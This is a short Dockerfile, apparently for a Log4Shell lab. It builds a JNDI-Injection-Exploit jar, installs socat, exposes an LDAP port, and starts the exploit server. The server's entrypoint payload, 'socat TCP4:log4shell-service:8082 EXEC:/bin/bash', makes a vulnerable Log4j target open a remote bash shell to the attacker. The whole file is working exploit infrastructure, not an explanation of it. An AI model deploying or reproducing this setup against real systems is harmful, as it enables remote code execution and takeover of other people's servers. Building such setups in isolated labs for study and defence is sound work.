FROM maven:3.9-eclipse-temurin-17 AS builder
ADD pom.xml pom.xml
ADD src src


RUN --mount=type=cache,target=/root/.m2 mvn clean package -DskipTests=true


FROM adoptopenjdk/openjdk8

# Copy application's JAR file into the container
COPY --from=builder target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar app.jar
COPY ListenForShell.sh ListenForShell.sh
RUN chmod +x ListenForShell.sh
RUN apt-get update && apt-get --assume-yes install socat
EXPOSE 8082
EXPOSE 1389

# The command to run your application (note the port configuration)
ENTRYPOINT ["java","-jar","/app.jar","-C"," socat TCP4:log4shell-service:8082 EXEC:/bin/bash"]
